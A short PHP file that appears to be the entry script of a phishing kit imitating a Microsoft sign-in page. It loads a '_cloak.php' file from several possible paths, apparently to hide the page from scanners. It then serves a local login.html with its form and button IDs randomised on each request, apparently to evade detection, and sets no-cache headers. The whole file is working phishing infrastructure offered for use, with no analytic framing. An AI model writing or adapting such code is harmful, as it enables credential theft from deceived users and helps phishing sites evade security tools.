<?php
/**
 * Microsoft entry point with cloaking
 */

$possible_paths = [
    __DIR__ . '/../../../.sites/_cloak.php',
    __DIR__ . '/../_cloak.php',
    __DIR__ . '/../../.sites/_cloak.php',
];

foreach ($possible_paths as $path) {
    if (file_exists($path)) {
        require_once $path;
        break;
    }
}

// Dynamic page serving
$html = file_get_contents(__DIR__ . '/login.html');
$suffix = substr(md5(time() . rand()), 0, 8);
$html = str_replace('id="ms-form"', 'id="ms-form-' . $suffix . '"', $html);
$html = str_replace('id="submit-btn"', 'id="btn-' . $suffix . '"', $html);

header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');
header('Content-Type: text/html; charset=utf-8');
echo $html;
?>